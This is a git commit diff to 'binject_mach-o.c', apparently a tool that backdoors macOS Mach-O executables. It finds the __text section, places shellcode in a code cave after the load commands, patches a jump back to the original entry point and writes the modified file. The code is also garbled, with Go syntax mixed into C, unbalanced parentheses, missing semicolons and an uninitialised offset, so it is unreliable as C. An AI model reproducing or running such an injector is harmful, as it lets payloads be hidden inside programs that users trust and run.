b0fdae0a0c9f007fd468c82d9dff1aea58c39f89
Satoshi32 <97588974+Satoshi32@users.noreply.github.com>
2022-12-12 14:38:09 +0100

    Update binject_mach-o.c

--- binject_mach-o.c
+++ binject_mach-o.c
@@ -8,10 +8,11 @@ int binject_MACH-O(char *file,char *shellcode)
    char *file_buffer = calloc(1,size);
 	shellcodefixed = ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
 				scfixedlen=strlen(shellcodefixed);
-	caveOffset= 0x20;
-			caveOffset+=machoFile.FileHeader.Cmdsz
-				for(i=0;i<ncommands;i++)
-				{
+	uint32_t caveOffset;
+	caveOffset+= 0x20;
+	caveOffset+=machoFile.FileHeader.Cmdsz
+for(i=0;i<ncommands;i++)
+ {
 					load_command *cmd=(struct load_command*)address;
     for(i=0;i<sections;i++)
   {
@@ -20,39 +21,26 @@ int binject_MACH-O(char *file,char *shellcode)
             struct segment_command *segmentCommand = (struct segment_command*)address;
             if (strncmp(segmentCommand->segname, "__TEXT", 16) == 0)
             {
-                // address of the first section
-                uint8_t *sectionAddress = address + sizeof(struct segment_command);
+                uint32_t *sectionAddress = address + sizeof(struct segment_command);
                 struct section *sectionCommand = NULL; 
-                // iterate thru all sections
-                for (uint32_t x = 0; x < segmentCommand->nsects; x++)
+                for (i = 0; i < segmentCommand->nsects; i++)
                 {
-                    sectionCommand = (struct section*)(sectionAddress);
+			sectionCommand = (struct section*)(sectionAddress);
                     if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                     {
-                        // retrieve the offset for this section
-                        targetInfo->textOffset  = sectionCommand->offset;
-                        targetInfo->textAddress = sectionCommand->addr;
-                        targetInfo->textSize    = sectionCommand->size;
+                      
+			if(scfixedlen<sectionCommand->offset-caveOffset)
+			{
+				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
+				 fwrite(buf,1,size,f);
+			break;
+		        }    
                     }
                     sectionAddress += sizeof(struct section);
                 }
             }
-        }
-                       for _, section := range machoFile.Sections {
-		if (strstr(section.SectionHeader.Seg,"__TEXT") && strstr(section.Name,"__text")) {
-			
-			
-			
-			if(scfixedlen<section.Offset-caveOffset)
-			{
-				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
-			break;
-				       }
-		}
-	}
- 
-  }
-				       address+=cmd->cmdsize
-				       }                
-  free(file_buffer);
+          }
+				       address+=cmd->cmdsize;
+ }                
+return -1;				       
 }
